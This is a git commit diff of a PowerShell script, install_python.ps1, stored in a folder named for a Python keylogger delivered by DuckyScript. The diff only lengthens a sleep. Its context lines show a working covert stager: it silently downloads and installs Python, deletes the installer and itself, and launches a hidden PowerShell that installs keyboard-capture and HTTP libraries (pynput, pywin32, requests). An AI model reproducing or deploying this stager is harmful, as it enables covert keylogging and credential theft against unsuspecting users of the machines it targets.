2dfe0248928a7e59fcfa5bf00c4d1d00eb7dd697
csandoval63 <csandoval63@student.rcc.edu>
2020-05-14 17:42:17 -0700

    Update install_python.ps1

--- Python keylogger stuff with DUCKYscript/install_python.ps1
+++ Python keylogger stuff with DUCKYscript/install_python.ps1
@@ -2,7 +2,7 @@
 wget "https://www.python.org/ftp/python/3.8.0/python-3.8.0.exe" -outfile "C:\Users\Public\python-3.8.0.exe"
 C:\Users\Public\python-3.8.0.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
-Start-Sleep -Seconds 10
+Start-Sleep -Seconds 40
 Remove-Item C:\Users\Public\python-3.8.0.exe
 Remove-Item .\install_python.ps1
 invoke-expression 'cmd /c start powershell -Command { Start-Sleep -Seconds 20; $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"); python -m pip install --upgrade pip; pip install wheel; pip install pynput; pip install pywin32; pip install requests; pip install easygui }'
